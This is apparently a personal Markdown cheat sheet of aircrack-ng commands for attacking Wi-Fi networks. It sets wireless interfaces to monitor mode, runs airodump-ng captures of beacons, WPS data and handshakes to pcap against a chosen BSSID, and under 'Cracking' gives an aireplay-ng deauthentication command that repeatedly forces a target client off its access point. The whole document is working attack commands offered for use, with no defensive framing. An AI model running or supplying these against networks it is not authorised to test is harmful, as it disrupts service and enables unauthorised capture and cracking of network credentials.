## Driver
```bash
https://github.com/aircrack-ng/rtl8812au
```

## Settings
```bash
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

ip link set wlan1 down
iw dev wlan1 set type monitor
ip link set wlan1 up
```

## Monitor

### Generic
```bash
airodump-ng --manufacturer --beacons --showack --wps --uptime --band a wlan0

airodump-ng --manufacturer --beacons --showack --wps --uptime --band bg wlan0
```

```bash
airodump-ng --manufacturer --beacons --showack --wps --uptime \
            --band abg --write-interval 5 --output-format pcap wlan0 --write session0
```

### Target
```bash
airodump-ng --manufacturer --beacons --showack --wps --uptime \
            --bssid 00:00:00:00:00:00 --channel 1 wlan0
```

```bash
airodump-ng --manufacturer --beacons --showack --wps --uptime \
            --bssid 00:00:00:00:00:00 --channel 1 \
            --write-interval 5 --output-format pcap wlan0 --write session0
```

## Cracking
```bash
iwconfig wlan1 channel 4

aireplay-ng -0 99 -D -a BSSID -c TARGET wlan1
```

## Kill View
```bash
kill -9 `ps aux | grep -i aircrack | awk '{print $2}'`
```
